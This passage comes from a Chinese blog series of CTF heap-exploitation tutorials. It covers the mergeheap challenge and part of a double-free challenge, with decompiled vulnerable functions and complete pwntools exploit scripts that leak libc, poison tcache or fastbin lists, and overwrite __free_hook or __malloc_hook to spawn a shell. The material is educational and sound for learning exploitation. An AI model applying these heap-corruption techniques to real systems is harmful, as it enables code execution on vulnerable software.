tcache, so we can use unsortbin consolidate</span></span><br><span class="line">    free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6   tcache</span></span><br><span class="line">    <span class="comment"># chunk-5   tcache</span></span><br><span class="line">    <span class="comment"># chunk-4   tcache</span></span><br><span class="line">    <span class="comment"># chunk-3   tcache</span></span><br><span class="line">    <span class="comment"># chunk-2   tcache</span></span><br><span class="line">    <span class="comment"># chunk-1   tcache</span></span><br><span class="line">    <span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line">    <span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line">    <span class="comment"># chunk - 9 unsorted</span></span><br><span class="line">    <span class="comment"># chunk-0   tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0 chunk-9</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line">    free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">    free(<span class="number">0</span>) </span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">    malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">    io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><p>vmmap 这个命令可以指定具体想要查看的内容，比如</p><ol><li>vmmap libc</li><li>vmmap heap</li><li>vmmap stack</li><li>vmmap map</li></ol><p>tcache是FILO,跟栈是类似的</p><p>patchelf 可以指定版本libc, 这样可以调试带符号的libc，加上glibc-all-in-one这个项目或者自己去下载glibc就可以用pwndbg的那些heap bins等命令了<br>具体如下：<br>patchelf –set-interpreter libc目录/ld-2.27.so –set-rpath libc目录 文件名</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>加入tcache后攻击方法变得相对简单，堆块的申请却变得复杂了，因为在leak的时候要考虑tcache，以及构造的时候也要考虑tcache</li><li>我觉得不需要跟我一样标注出每个堆块的位置，我只是学习tcache，所以标注出来方便自己看</li><li>堆块重用这部分经常都是跟off-by-one结合起来</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdGNhY2hlX2F0dGFjay16aC8jY2hhbGxlbmdlLTEtbGN0ZjIwMTgtcHduLWVhc3lfaGVhcA==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-1-lctf2018-pwn-easy_heap">ctf-wiki<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f37fbe7f/">https://noone-hub.github.io/posts/f37fbe7f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程6</title>
    <url>/posts/84788ee9/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程6"><a href="#pwn堆入门系列教程6" class="headerlink" title="pwn堆入门系列教程6"></a>pwn堆入门系列教程6</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span></p><p>要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h2><p>我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>新建一个堆块</li><li>展示堆块内容</li><li>删除一个堆块</li><li>合并两个堆块内容</li><li>退出</li></ol><p>乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">14</span> || !qword_2020A0[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  v3 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">14</span> || !qword_2020A0[v3] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  v4 = dword_202060[v2] + dword_202060[v3];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  <span class="built_in">strcpy</span>(qword_2020A0[i], qword_2020A0[v2]);</span><br><span class="line">  <span class="built_in">strcat</span>(qword_2020A0[i], qword_2020A0[v3]);</span><br><span class="line">  dword_202060[i] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D72</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_2020A0[v2]);</span><br><span class="line">    qword_2020A0[v2] = <span class="number">0L</span>L;</span><br><span class="line">    v0 = dword_202060;</span><br><span class="line">    dword_202060[v2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free过后，堆块内容未清空，也就是说，我们申请一个堆块，然后free掉，在申请到这个堆块时候，就可以查看原来堆块的内容</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>初始化堆块操作</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br></pre></td></tr></table></figure><ol start="2"><li>填满tcache，并利用unsortbin泄露libc地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure><p>我反过来删除是因为show好弄些，也可以正向删除，show(7)</p><ol start="3"><li>重点，这里的大小要构造好，被复制和被覆盖的得分清楚，最后造成overlap chunk，然后修改tcache的fd指针成malloc_hook就行了，这里跟fastbin不太相似，fastbin这种攻击大小限制得是0x70大小chunk，因为错位的时候只有0x7f通常</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4 被复制的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6 size部分将被覆盖</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br></pre></td></tr></table></figure><ol start="4"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'mergeheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'mergeheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc-2.27.so'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">7</span>-i)</span><br><span class="line">    add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">    add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn1"><a href="#2019-网络内生安全试验场-pwn1" class="headerlink" title="2019 网络内生安全试验场 pwn1"></a>2019 网络内生安全试验场 pwn1</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>创建一个堆块</li><li>展示所有堆块</li><li>删除一个堆块</li><li>删除所有堆块</li><li>离开</li></ol><h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( lifecount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which life do you want to remove: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !*(&amp;lifelist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)*(&amp;lifelist + v1) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;lifelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Successful , God !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No life in this lonely planet~ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在double free，free后为置空</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>我是多次利用double free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了</p><ol><li>利用double free泄露地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line"></span><br><span class="line">libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用double free改写地址</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure><ol start="3"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span 